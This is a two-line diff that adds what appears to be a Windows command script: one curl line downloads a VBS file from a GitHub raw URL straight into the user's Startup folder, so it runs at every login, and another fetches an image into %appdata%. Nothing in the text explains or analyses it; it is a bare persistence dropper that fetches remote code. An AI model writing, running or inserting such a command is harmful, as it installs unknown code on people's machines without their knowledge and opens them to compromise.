@@ -1,0 +1,2 @@
+curl -L https://raw.githubusercontent.com/maateww1/filesss/main/GBM.vbs -o "%appdata%\Microsoft\Windows\Start Menu\Programs\Startup\GBM.vbs" 
+curl -o "%appdata%\gucci.png" https://yt3.googleusercontent.com/ytc/APkrFKYyLmlQ8kfl5906a5nGY3FiBmfbGo_-XoWfc4Xg=s900-c-k-c0x00ffffff-no-rj
